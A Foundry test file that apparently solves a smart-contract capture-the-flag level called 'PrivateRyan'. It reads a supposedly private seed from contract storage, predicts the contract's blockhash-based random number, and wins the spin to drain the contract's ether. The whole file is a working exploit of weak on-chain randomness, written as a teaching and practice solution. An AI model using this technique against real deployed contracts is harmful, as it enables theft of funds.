// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.deal(user1, 0.02 ether);
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        uint256 storedSeed = uint256(
            vm.load(address(instance), bytes32(uint256(0)))
        );
        console.log("Extracted seed:", storedSeed);

        uint256 factor = (getFactor() * 100) / 100;
        uint256 hashVal = uint256(blockhash(48743985 - storedSeed));
        uint256 predictedNumber = uint256((uint256(hashVal) / factor)) % 100;

        console.log("Block hash:", hashVal);
        console.log("Predicted number:", predictedNumber);

        vm.prank(user1);
        instance.spin{value: 0.01 ether}(predictedNumber);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(
            address(instance).balance == 0,
            "Solution is not solving the level"
        );
    }

    function getFactor() public pure returns (uint256) {
        return
            1157920892373161954135709850086879078532699843656405640394575840079131296399;
    }
}
